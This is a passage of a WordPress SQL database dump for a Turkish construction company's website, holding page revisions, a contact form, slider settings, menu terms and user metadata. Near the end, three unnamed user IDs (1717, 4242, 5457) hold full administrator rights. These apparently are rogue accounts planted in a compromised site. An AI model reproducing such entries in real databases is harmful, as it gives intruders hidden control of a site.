alt=\"serifoglu-011\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/serifoglu-011.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/seyithanoglu_ahsap.png\"><img class=\"alignnone size-full wp-image-983\" alt=\"seyithanoglu_ahsap\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/seyithanoglu_ahsap.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/tepe_insaat_malzemeleri.png\"><img class=\"alignnone size-full wp-image-984\" alt=\"tepe_insaat_malzemeleri\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/tepe_insaat_malzemeleri.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/Winsa-011.png\"><img class=\"alignnone size-full wp-image-985\" alt=\"Winsa-011\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/Winsa-011.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/yuksel_elektrik.png\"><img class=\"alignnone size-full wp-image-986\" alt=\"yuksel_elektrik\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/yuksel_elektrik.png\" width=\"173\" height=\"108\" /></a>","Çözüm Ortakları","","inherit","open","open","","946-revision-v1","","","2014-08-29 23:11:40","2014-08-29 20:11:40","","946","http://herkonyapi.com/946-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("993","1","2014-08-29 23:31:29","2014-08-29 20:31:29","","logo","","inherit","open","open","","logo","","","2014-08-29 23:31:29","2014-08-29 20:31:29","","0","http://herkonyapi.com/wp-content/uploads/2014/08/logo.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("995","1","2014-08-30 00:25:58","2014-08-29 21:25:58","<p>Adınız (gerekli)<br />
    [text* your-name] </p>

<p>Epostanız (gerekli)<br />
    [email* your-email] </p>

<p>Telefon (gerekli)<br />
    [tel* tel-876] </p>

<p>Adres<br />
    [textarea textarea-659]</p>

<p>İletiniz<br />
    [textarea your-message] </p>
<p>[captchac captcha-357 size:m] [captchar captcha-357]</p>

<p>[submit \"Gönder\"]</p>
Bina Yenileme Talebi
info@herkonyapi.com
Kimden: [your-name] <[your-email]>
Email: [your-email]
Telefon: [tel-876]

Adres:
[textarea-659]

İleti:
[your-message]

--
Bu e-posta Herkon Yapı (http://herkonyapi.com) adresindeki iletişim formundan gönderildi
info@herkonyapi.com


1


[your-subject]
[your-name] <[your-email]>
İleti Gövdesi:
[your-message]

--
Bu e-posta Herkon Yapı (http://herkonyapi.com) adresindeki iletişim formundan gönderildi
[your-email]




İletiniz başarılı olarak gönderildi. Teşekkürler.
İletinizi gönderme başarısız oldu. Lütfen daha sonra tekrar deneyin ya da yönetici ile başka bir yöntemle iletişime geçin.
Onaylama hataları meydana geldi. Lütfen alanları doğrulayın ve tekrar gönderin.
İletinizi gönderme başarısız oldu. Lütfen daha sonra tekrar deneyin ya da yönetici ile başka bir yöntemle iletişime geçin.
İlerlemek için lütfen koşulları kabul edin.
Lütfen gerekli alanları doldurun.
Girdiğiniz kod doğru değil.
Sayı biçimi geçersiz görünüyor.
Bu sayı çok küçük.
Bu sayı çok büyük.
Eposta adresi geçersiz görünüyor.
URL geçersiz görünüyor.
Telefon numarası geçersiz görünüyor.
Yanıtınız doğru değil.
Tarih biçimi geçersiz görünüyor.
Bu tarih çok erken.
Bu tarih çok geç.
Dosya gönderme başarısız.
Bu dosya türüne izin verilmiyor.
Bu dosya çok büyük.
Dosya gönderme başarısız. Hata meydana geldi.","Binamı Yeniletmek İstiyorum","","publish","open","open","","binami-yeniletmek-istiyorum","","","2014-09-02 09:21:16","2014-09-02 06:21:16","","0","http://herkonyapi.com/?post_type=wpcf7_contact_form&#038;p=995","0","wpcf7_contact_form","","0");
INSERT INTO `cmrfu_posts` VALUES("997","1","2014-08-30 00:38:04","2014-08-29 21:38:04","","4","","inherit","open","open","","4-3","","","2014-08-30 00:38:04","2014-08-29 21:38:04","","944","http://herkonyapi.com/wp-content/uploads/2014/08/4.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("998","1","2014-08-30 00:38:49","2014-08-29 21:38:49","<a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/4.jpg\"><img class=\" wp-image-997 alignright\" alt=\"4\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/4.jpg\" width=\"390\" height=\"551\" /></a>

Herkon Yapı, 1993’ e kadar proje bazında yürüttüğünü çalışmaları 1993 yılında

Hakan Yapı adı altında kurumsallaşmış, 2007 yılında da isim değişikliğine giderek

Herkon bünyesinde toplanmış dürüstlük ve istikrar politikalarını gözeterek yapmış

olduğu başarılı çalışmalarla inşaat sektöründe kökleşmiş örnek bir firmadır.

Beşiktaş, Ortaköy, Şişli, Ulus, Teşvikiye, Maçka bölgelerinde bugüne kadar ürettiği

sayısız projede % 100 başarıya ulaşmanın haklı gururu ve özgüveniyle bundan sonra

gerçekleştireceği tüm projeleri de başarıyla tamamlayacak olmanın güvencesini

vermektedir.
<h4>Vizyonumuz ;</h4>
Estetik ve fonksiyonel açıdan en iyi çözümlerle farklı tasarımlar oluşturarak, kaliteden

ödün vermeden müşteri beklentilerinin üstüne çıkmak, müşterilerimizin koşulsuz

memnuniyetini sağlamak ve sektörümüze öncülük etmektir…
<h4>Misyonumuz ;</h4>
Yüksek standartlı,kaliteli hizmet,kaliteli malzeme kullanarak müşteri memnuniyetini

en üst düzeye çıkarmak, Müşterilerimizin zamanına ve haklarına saygı duymak,

sektör ile alakalı yönetmeliklere %100 uyumlu projeler yaparak

İnsanlığa , çevreye ve evrensel değerlere olan sorumluluklarımızı yerine getirmektir…","Herkon Yapı","","inherit","open","open","","944-autosave-v1","","","2014-08-30 00:38:49","2014-08-29 21:38:49","","944","http://herkonyapi.com/944-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("999","1","2014-08-30 00:39:09","2014-08-29 21:39:09","<a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/4.jpg\"><img class=\" wp-image-997 alignright\" alt=\"4\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/4.jpg\" width=\"312\" height=\"441\" /></a>

Herkon Yapı, 1993’ e kadar proje bazında yürüttüğünü çalışmaları 1993 yılında

Hakan Yapı adı altında kurumsallaşmış, 2007 yılında da isim değişikliğine giderek

Herkon bünyesinde toplanmış dürüstlük ve istikrar politikalarını gözeterek yapmış

olduğu başarılı çalışmalarla inşaat sektöründe kökleşmiş örnek bir firmadır.

Beşiktaş, Ortaköy, Şişli, Ulus, Teşvikiye, Maçka bölgelerinde bugüne kadar ürettiği

sayısız projede % 100 başarıya ulaşmanın haklı gururu ve özgüveniyle bundan sonra

gerçekleştireceği tüm projeleri de başarıyla tamamlayacak olmanın güvencesini

vermektedir.
<h4>Vizyonumuz ;</h4>
Estetik ve fonksiyonel açıdan en iyi çözümlerle farklı tasarımlar oluşturarak, kaliteden

ödün vermeden müşteri beklentilerinin üstüne çıkmak, müşterilerimizin koşulsuz

memnuniyetini sağlamak ve sektörümüze öncülük etmektir…
<h4>Misyonumuz ;</h4>
Yüksek standartlı,kaliteli hizmet,kaliteli malzeme kullanarak müşteri memnuniyetini

en üst düzeye çıkarmak, Müşterilerimizin zamanına ve haklarına saygı duymak,

sektör ile alakalı yönetmeliklere %100 uyumlu projeler yaparak

İnsanlığa , çevreye ve evrensel değerlere olan sorumluluklarımızı yerine getirmektir…","Herkon Yapı","","inherit","open","open","","944-revision-v1","","","2014-08-30 00:39:09","2014-08-29 21:39:09","","944","http://herkonyapi.com/944-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1000","1","2014-08-30 00:39:37","2014-08-29 21:39:37","<a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/4.jpg\"><img class=\" wp-image-997 alignright\" alt=\"4\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/4.jpg\" width=\"406\" height=\"573\" /></a>

Herkon Yapı, 1993’ e kadar proje bazında yürüttüğünü çalışmaları 1993 yılında

Hakan Yapı adı altında kurumsallaşmış, 2007 yılında da isim değişikliğine giderek

Herkon bünyesinde toplanmış dürüstlük ve istikrar politikalarını gözeterek yapmış

olduğu başarılı çalışmalarla inşaat sektöründe kökleşmiş örnek bir firmadır.

Beşiktaş, Ortaköy, Şişli, Ulus, Teşvikiye, Maçka bölgelerinde bugüne kadar ürettiği

sayısız projede % 100 başarıya ulaşmanın haklı gururu ve özgüveniyle bundan sonra

gerçekleştireceği tüm projeleri de başarıyla tamamlayacak olmanın güvencesini

vermektedir.
<h4>Vizyonumuz ;</h4>
Estetik ve fonksiyonel açıdan en iyi çözümlerle farklı tasarımlar oluşturarak, kaliteden

ödün vermeden müşteri beklentilerinin üstüne çıkmak, müşterilerimizin koşulsuz

memnuniyetini sağlamak ve sektörümüze öncülük etmektir…
<h4>Misyonumuz ;</h4>
Yüksek standartlı,kaliteli hizmet,kaliteli malzeme kullanarak müşteri memnuniyetini

en üst düzeye çıkarmak, Müşterilerimizin zamanına ve haklarına saygı duymak,

sektör ile alakalı yönetmeliklere %100 uyumlu projeler yaparak

İnsanlığa , çevreye ve evrensel değerlere olan sorumluluklarımızı yerine getirmektir…","Herkon Yapı","","inherit","open","open","","944-revision-v1","","","2014-08-30 00:39:37","2014-08-29 21:39:37","","944","http://herkonyapi.com/944-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1046","1","2016-11-05 02:09:15","2016-11-05 00:09:15","[cols]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Projelerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Binamı Yeniletmek İstiyorum\"][/heading]
[contact-form-7 id=\"995\" title=\"Binamı Yeniletmek İstiyorum\"]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"https://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul Istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Nüzhetiye Caddesi Beşiktaş  Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Anasayfa","","inherit","closed","closed","","524-revision-v1","","","2016-11-05 02:09:15","2016-11-05 00:09:15","","524","https://www.herkonyapi.com/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1053","1","2017-03-22 11:48:09","0000-00-00 00:00:00","","Otomatik taslak","","auto-draft","open","open","","","","","2017-03-22 11:48:09","0000-00-00 00:00:00","","0","https://www.herkonyapi.com/?p=1053","0","post","","0");


DROP TABLE IF EXISTS `cmrfu_revslider_sliders`;

CREATE TABLE `cmrfu_revslider_sliders` (
  `id` int(9) NOT NULL AUTO_INCREMENT,
  `title` tinytext NOT NULL,
  `alias` tinytext,
  `params` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

INSERT INTO `cmrfu_revslider_sliders` VALUES("1","Anasayfa","home","{\"title\":\"Anasayfa\",\"alias\":\"home\",\"shortcode\":\"[rev_slider home]\",\"slider_type\":\"responsitive\",\"width\":\"960\",\"height\":\"350\",\"responsitive_w1\":\"940\",\"responsitive_sw1\":\"770\",\"responsitive_w2\":\"780\",\"responsitive_sw2\":\"500\",\"responsitive_w3\":\"510\",\"responsitive_sw3\":\"310\",\"responsitive_w4\":\"\",\"responsitive_sw4\":\"\",\"responsitive_w5\":\"\",\"responsitive_sw5\":\"\",\"responsitive_w6\":\"\",\"responsitive_sw6\":\"\",\"delay\":\"9000\",\"touchenabled\":\"on\",\"stop_on_hover\":\"on\",\"shuffle\":\"off\",\"php_resize\":\"off\",\"load_googlefont\":\"false\",\"google_font\":\"PT+Sans+Narrow:400,700\",\"stop_slider\":\"off\",\"stop_after_loops\":\"0\",\"stop_at_slide\":\"2\",\"position\":\"center\",\"margin_top\":\"0\",\"margin_bottom\":\"0\",\"margin_left\":\"0\",\"margin_right\":\"0\",\"shadow_type\":\"2\",\"show_timerbar\":\"true\",\"timebar_position\":\"top\",\"background_color\":\"#E9E9E9\",\"padding\":\"5\",\"show_background_image\":\"false\",\"background_image\":\"\",\"navigaion_type\":\"none\",\"navigation_arrows\":\"nexttobullets\",\"navigation_style\":\"round\",\"nav_offset_hor\":\"0\",\"nav_offset_vert\":\"20\",\"navigaion_always_on\":\"false\",\"hide_thumbs\":\"200\",\"thumb_width\":\"100\",\"thumb_height\":\"50\",\"thumb_amount\":\"5\",\"hide_slider_under\":\"0\",\"hide_defined_layers_under\":\"0\",\"hide_all_layers_under\":\"0\",\"jquery_noconflict\":\"on\",\"js_to_body\":\"false\",\"output_type\":\"none\"}");


DROP TABLE IF EXISTS `cmrfu_revslider_slides`;

CREATE TABLE `cmrfu_revslider_slides` (
  `id` int(9) NOT NULL AUTO_INCREMENT,
  `slider_id` int(9) NOT NULL,
  `slide_order` int(11) NOT NULL,
  `params` text NOT NULL,
  `layers` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=utf8;

INSERT INTO `cmrfu_revslider_slides` VALUES("5","1","3","{\"image\":\"https:\\/\\/www.herkonyapi.com\\/wp-content\\/uploads\\/2014\\/06\\/slide2.png\"}","");
INSERT INTO `cmrfu_revslider_slides` VALUES("6","1","2","{\"image\":\"https:\\/\\/www.herkonyapi.com\\/wp-content\\/uploads\\/2014\\/06\\/slide3.png\"}","");
INSERT INTO `cmrfu_revslider_slides` VALUES("7","1","1","{\"image\":\"https:\\/\\/www.herkonyapi.com\\/wp-content\\/uploads\\/2014\\/02\\/517_Residential_Integral-Construction-Mtn-View-Road-Home.jpg-960x350.jpg\"}","");


DROP TABLE IF EXISTS `cmrfu_term_relationships`;

CREATE TABLE `cmrfu_term_relationships` (
  `object_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `term_taxonomy_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `term_order` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`object_id`,`term_taxonomy_id`),
  KEY `term_taxonomy_id` (`term_taxonomy_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_term_relationships` VALUES("11","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("12","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("13","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("14","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("141","58","0");
INSERT INTO `cmrfu_term_relationships` VALUES("151","58","0");
INSERT INTO `cmrfu_term_relationships` VALUES("146","60","0");
INSERT INTO `cmrfu_term_relationships` VALUES("159","58","0");
INSERT INTO `cmrfu_term_relationships` VALUES("162","60","0");
INSERT INTO `cmrfu_term_relationships` VALUES("162","58","0");
INSERT INTO `cmrfu_term_relationships` VALUES("141","60","0");
INSERT INTO `cmrfu_term_relationships` VALUES("168","60","0");
INSERT INTO `cmrfu_term_relationships` VALUES("168","58","0");
INSERT INTO `cmrfu_term_relationships` VALUES("166","58","0");
INSERT INTO `cmrfu_term_relationships` VALUES("166","60","0");
INSERT INTO `cmrfu_term_relationships` VALUES("173","60","0");
INSERT INTO `cmrfu_term_relationships` VALUES("173","58","0");
INSERT INTO `cmrfu_term_relationships` VALUES("177","60","0");
INSERT INTO `cmrfu_term_relationships` VALUES("177","58","0");
INSERT INTO `cmrfu_term_relationships` VALUES("182","60","0");
INSERT INTO `cmrfu_term_relationships` VALUES("182","58","0");
INSERT INTO `cmrfu_term_relationships` VALUES("146","58","0");
INSERT INTO `cmrfu_term_relationships` VALUES("151","60","0");
INSERT INTO `cmrfu_term_relationships` VALUES("159","60","0");
INSERT INTO `cmrfu_term_relationships` VALUES("186","59","0");
INSERT INTO `cmrfu_term_relationships` VALUES("710","51","0");
INSERT INTO `cmrfu_term_relationships` VALUES("715","51","0");
INSERT INTO `cmrfu_term_relationships` VALUES("716","52","0");
INSERT INTO `cmrfu_term_relationships` VALUES("717","52","0");
INSERT INTO `cmrfu_term_relationships` VALUES("921","51","0");
INSERT INTO `cmrfu_term_relationships` VALUES("942","51","0");
INSERT INTO `cmrfu_term_relationships` VALUES("915","52","0");
INSERT INTO `cmrfu_term_relationships` VALUES("934","51","0");
INSERT INTO `cmrfu_term_relationships` VALUES("748","53","0");
INSERT INTO `cmrfu_term_relationships` VALUES("749","53","0");
INSERT INTO `cmrfu_term_relationships` VALUES("750","53","0");
INSERT INTO `cmrfu_term_relationships` VALUES("751","53","0");
INSERT INTO `cmrfu_term_relationships` VALUES("950","51","0");
INSERT INTO `cmrfu_term_relationships` VALUES("948","51","0");
INSERT INTO `cmrfu_term_relationships` VALUES("924","1","0");
INSERT INTO `cmrfu_term_relationships` VALUES("949","51","0");
INSERT INTO `cmrfu_term_relationships` VALUES("759","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("760","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("761","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("762","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("763","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("764","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("765","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("766","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("767","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("768","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("769","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("770","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("771","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("772","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("773","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("774","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("775","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("776","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("777","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("778","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("779","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("780","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("781","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("782","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("783","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("784","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("785","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("786","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("787","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("788","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("789","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("790","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("791","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("792","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("793","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("794","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("795","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("796","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("797","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("798","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("799","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("800","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("801","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("943","51","0");
INSERT INTO `cmrfu_term_relationships` VALUES("186","58","0");
INSERT INTO `cmrfu_term_relationships` VALUES("184","58","0");
INSERT INTO `cmrfu_term_relationships` VALUES("184","60","0");


DROP TABLE IF EXISTS `cmrfu_term_taxonomy`;

CREATE TABLE `cmrfu_term_taxonomy` (
  `term_taxonomy_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `term_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `taxonomy` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `description` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `parent` bigint(20) unsigned NOT NULL DEFAULT '0',
  `count` bigint(20) NOT NULL DEFAULT '0',
  PRIMARY KEY (`term_taxonomy_id`),
  UNIQUE KEY `term_id_taxonomy` (`term_id`,`taxonomy`),
  KEY `taxonomy` (`taxonomy`)
) ENGINE=MyISAM AUTO_INCREMENT=61 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_term_taxonomy` VALUES("1","1","category","","0","1");
INSERT INTO `cmrfu_term_taxonomy` VALUES("27","27","post_tag","","0","0");
INSERT INTO `cmrfu_term_taxonomy` VALUES("51","51","nav_menu","","0","9");
INSERT INTO `cmrfu_term_taxonomy` VALUES("52","52","nav_menu","","0","3");
INSERT INTO `cmrfu_term_taxonomy` VALUES("53","53","nav_menu","","0","4");
INSERT INTO `cmrfu_term_taxonomy` VALUES("54","54","nav_menu","","0","47");
INSERT INTO `cmrfu_term_taxonomy` VALUES("55","55","post_format","","0","0");
INSERT INTO `cmrfu_term_taxonomy` VALUES("56","56","post_format","","0","0");
INSERT INTO `cmrfu_term_taxonomy` VALUES("57","57","post_format","","0","0");
INSERT INTO `cmrfu_term_taxonomy` VALUES("58","58","portfolio_category","","0","12");
INSERT INTO `cmrfu_term_taxonomy` VALUES("59","59","portfolio_category","","58","1");
INSERT INTO `cmrfu_term_taxonomy` VALUES("60","60","portfolio_category","","58","11");


DROP TABLE IF EXISTS `cmrfu_termmeta`;

CREATE TABLE `cmrfu_termmeta` (
  `meta_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `term_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci,
  PRIMARY KEY (`meta_id`),
  KEY `term_id` (`term_id`),
  KEY `meta_key` (`meta_key`(191))
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;



DROP TABLE IF EXISTS `cmrfu_terms`;

CREATE TABLE `cmrfu_terms` (
  `term_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(200) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `slug` varchar(200) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `term_group` bigint(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`term_id`),
  KEY `slug` (`slug`(191)),
  KEY `name` (`name`(191))
) ENGINE=MyISAM AUTO_INCREMENT=61 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_terms` VALUES("1","Genel","genel","0");
INSERT INTO `cmrfu_terms` VALUES("27","wordpress","wordpress","0");
INSERT INTO `cmrfu_terms` VALUES("51","header","header","0");
INSERT INTO `cmrfu_terms` VALUES("52","footer","footer","0");
INSERT INTO `cmrfu_terms` VALUES("53","Custom Menu","custom-menu","0");
INSERT INTO `cmrfu_terms` VALUES("54","header-second","header-second","0");
INSERT INTO `cmrfu_terms` VALUES("55","Video","post-format-video","0");
INSERT INTO `cmrfu_terms` VALUES("56","Gallery","post-format-gallery","0");
INSERT INTO `cmrfu_terms` VALUES("57","Audio","post-format-audio","0");
INSERT INTO `cmrfu_terms` VALUES("58","Satılık","satilik","0");
INSERT INTO `cmrfu_terms` VALUES("59","Dükkan","dukkan","0");
INSERT INTO `cmrfu_terms` VALUES("60","Daire","daire","0");


DROP TABLE IF EXISTS `cmrfu_usermeta`;

CREATE TABLE `cmrfu_usermeta` (
  `umeta_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci,
  PRIMARY KEY (`umeta_id`),
  KEY `user_id` (`user_id`),
  KEY `meta_key` (`meta_key`(191))
) ENGINE=MyISAM AUTO_INCREMENT=79 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_usermeta` VALUES("1","1","first_name","herkon");
INSERT INTO `cmrfu_usermeta` VALUES("2","1","last_name","yapı");
INSERT INTO `cmrfu_usermeta` VALUES("3","1","nickname","herkon123");
INSERT INTO `cmrfu_usermeta` VALUES("4","1","description","");
INSERT INTO `cmrfu_usermeta` VALUES("5","1","rich_editing","true");
INSERT INTO `cmrfu_usermeta` VALUES("6","1","comment_shortcuts","false");
INSERT INTO `cmrfu_usermeta` VALUES("7","1","admin_color","fresh");
INSERT INTO `cmrfu_usermeta` VALUES("8","1","use_ssl","0");
INSERT INTO `cmrfu_usermeta` VALUES("9","1","show_admin_bar_front","true");
INSERT INTO `cmrfu_usermeta` VALUES("10","1","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("11","1","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("12","1","dismissed_wp_pointers","wp330_toolbar,wp330_saving_widgets,wp340_choose_image_from_library,wp340_customize_current_theme_link,wp350_media,wp360_revisions,wp360_locks,wp410_dfw");
INSERT INTO `cmrfu_usermeta` VALUES("13","1","show_welcome_panel","0");
INSERT INTO `cmrfu_usermeta` VALUES("14","1","cmrfu_dashboard_quick_press_last_post_id","1053");
INSERT INTO `cmrfu_usermeta` VALUES("15","1","closedpostboxes_dashboard","a:0:{}");
INSERT INTO `cmrfu_usermeta` VALUES("16","1","metaboxhidden_dashboard","a:1:{i:0;s:17:\"dashboard_primary\";}");
INSERT INTO `cmrfu_usermeta` VALUES("17","1","nav_menu_recently_edited","51");
INSERT INTO `cmrfu_usermeta` VALUES("18","1","managenav-menuscolumnshidden","a:4:{i:0;s:11:\"link-target\";i:1;s:11:\"css-classes\";i:2;s:3:\"xfn\";i:3;s:11:\"description\";}");
INSERT INTO `cmrfu_usermeta` VALUES("19","1","metaboxhidden_nav-menus","a:7:{i:0;s:8:\"add-post\";i:1;s:13:\"add-portfolio\";i:2;s:10:\"add-slider\";i:3;s:12:\"add-post_tag\";i:4;s:15:\"add-post_format\";i:5;s:22:\"add-portfolio_category\";i:6;s:17:\"add-portfolio_tag\";}");
INSERT INTO `cmrfu_usermeta` VALUES("20","1","cmrfu_user-settings","hidetb=1&imgsize=full&libraryContent=browse&editor=tinymce&mfold=o");
INSERT INTO `cmrfu_usermeta` VALUES("21","1","cmrfu_user-settings-time","1409341205");
INSERT INTO `cmrfu_usermeta` VALUES("22","1","cmrfu_eo_title","");
INSERT INTO `cmrfu_usermeta` VALUES("23","1","cmrfu_eo_metadesc","");
INSERT INTO `cmrfu_usermeta` VALUES("24","1","cmrfu_eo_metakey","");
INSERT INTO `cmrfu_usermeta` VALUES("25","1","_yoast_wpseo_profile_updated","1486244076");
INSERT INTO `cmrfu_usermeta` VALUES("26","1","googleplus","");
INSERT INTO `cmrfu_usermeta` VALUES("27","1","twitter","");
INSERT INTO `cmrfu_usermeta` VALUES("28","1","facebook","");
INSERT INTO `cmrfu_usermeta` VALUES("29","1","linkedin","");
INSERT INTO `cmrfu_usermeta` VALUES("30","1","pinterest","");
INSERT INTO `cmrfu_usermeta` VALUES("31","1","closedpostboxes_toplevel_page_wpcf7","a:0:{}");
INSERT INTO `cmrfu_usermeta` VALUES("32","1","metaboxhidden_toplevel_page_wpcf7","a:0:{}");
INSERT INTO `cmrfu_usermeta` VALUES("33","1","closedpostboxes_page","a:0:{}");
INSERT INTO `cmrfu_usermeta` VALUES("34","1","metaboxhidden_page","a:5:{i:0;s:10:\"postcustom\";i:1;s:16:\"commentstatusdiv\";i:2;s:11:\"commentsdiv\";i:3;s:7:\"slugdiv\";i:4;s:9:\"authordiv\";}");
INSERT INTO `cmrfu_usermeta` VALUES("35","1717","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("36","1717","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("37","1717","_yoast_wpseo_profile_updated","1418801367");
INSERT INTO `cmrfu_usermeta` VALUES("38","4242","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("39","4242","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("40","4242","_yoast_wpseo_profile_updated","1419731348");
INSERT INTO `cmrfu_usermeta` VALUES("41","5457","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("42","5457","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("43","5457","_yoast_wpseo_profile_updated","1420519558");
